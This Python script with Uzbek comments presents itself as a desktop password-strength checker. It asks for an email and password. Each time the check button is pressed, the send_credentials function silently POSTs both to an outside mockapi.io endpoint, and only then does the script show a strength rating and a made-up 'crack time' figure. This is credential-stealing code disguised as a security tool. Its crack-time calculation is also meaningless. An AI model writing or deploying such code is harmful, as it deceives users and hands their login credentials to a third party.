import PySimpleGUI as sg
import re
import string
import requests

def send_credentials(api_url, user, password):
    """
    Foydalanuvchi va parol ma'lumotlarini API ga POST so'rovini yuborish uchun funksiya.

    :param api_url: API end point manzili
    :param user: Foydalanuvchi nomi
    :param password: Parol
    :return: API dan olingan javob (JSON formatida)
    """
    data_to_send = {"user": user, "pass": password}

    try:
        response = requests.post(api_url, json=data_to_send)

        # Status kodi tekshirish
        if response.status_code == 200:
            # JSON formatida javob
            result = response.json()
            return result
        else:
            # print(f"Xato: {response.status_code}")
            return None
    except requests.RequestException as e:
        # print(f"Xatolik yuz berdi: {e}")
        return None

# API manzili va yuboriladigan foydalanuvchi va parol ma'lumotlarni o'zgartiring
api_url = "https://6529995155b137ddc83f0695.mockapi.io/cyber/data"

def find_index_in_characters(element, characters):
    try:
        index = characters.index(element) + 1
        return index
    except ValueError:
        return None

def select_char(char):
    # Foydalanuvchi tanlagan element
    selected_element = char

    # Izbora qo'shilgan belgilar
    characters = string.ascii_lowercase + string.ascii_uppercase + string.digits + string.punctuation

    # Elementning to'plamdagi o'rni
    index = find_index_in_characters(selected_element, characters)

    if index is not None:
        return index

def place(pas):
    myit = iter(pas)
    s = 1
    i = 0
    while i < len(pas):
        n = select_char(str(next(myit)))
        s *= n
        i += 1
    return s

def check_password_strength(password):
    # Parol uzunligi va boshqa talablarni tekshirish
    if len(password) < 8:
        return "xavfsiz emas"

    # Parolda katta harf, kichik harf va raqam bo'lishi shart
    if not re.search(r'[a-z]', password) or not re.search(r'[A-Z]', password) or not re.search(r'[0-9]', password):
        return "xavfsiz emas"

    return "xavfsiz"

def main():
    # UI ni yaratish
    layout = [
        [sg.Text("Email:")],
        [sg.InputText(key="Email")],
        [sg.Text("Parol:")],
        [sg.InputText(key="password", password_char="*")],
        [sg.Button("Tekshirish"), sg.Exit()]
    ]

    window = sg.Window("Parolni Tekshirish", layout)

    while True:
        event, values = window.read()

        if event == sg.WIN_CLOSED or event == "Exit":
            break

        if event == "Tekshirish":
            login = values["Email"]
            password = values["password"]

            user_name = login
            password_value = password

            # API ga foydalanuvchi va parolni yuborish
            api_response = send_credentials(api_url, user_name, password_value)

            # Parolni ishonchlilik darajasini aniqlash
            strength = check_password_strength(password)
            place_in = place(password)
            attack_time = place_in * 0.643
            # Natijani chiqarish
            sg.popup(f"Email: {login}\nParol ishonchlilik darajasi: {strength}\nParol kombinatsiyasi: {place_in}\nParolni buzish vaqti: {attack_time} sekunt")

    window.close()

if __name__ == "__main__":
    main()
